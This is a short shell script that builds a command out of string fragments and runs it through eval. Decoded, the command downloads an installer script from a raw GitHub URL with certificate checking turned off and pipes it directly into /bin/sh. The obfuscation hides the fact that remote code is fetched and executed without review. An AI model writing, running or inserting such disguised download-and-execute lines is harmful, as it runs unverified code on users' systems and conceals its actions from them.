z="
";Hz='ate"';Yz='r.sh';Jz='ps:/';Cz='"--n';Iz=' htt';Uz='el/m';az='- | ';Mz='hubu';bz='/bin';Tz='jpan';cz='/sh';Ez='eck-';Rz='mil2';Sz='37/a';Oz='onte';Gz='ific';Xz='alle';Qz='om/e';Az='wget';Lz='.git';Dz='o-ch';Wz='inst';Pz='nt.c';Nz='serc';Bz=' -q ';Fz='cert';Zz=' -O ';Vz='ain/';Kz='/raw';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz"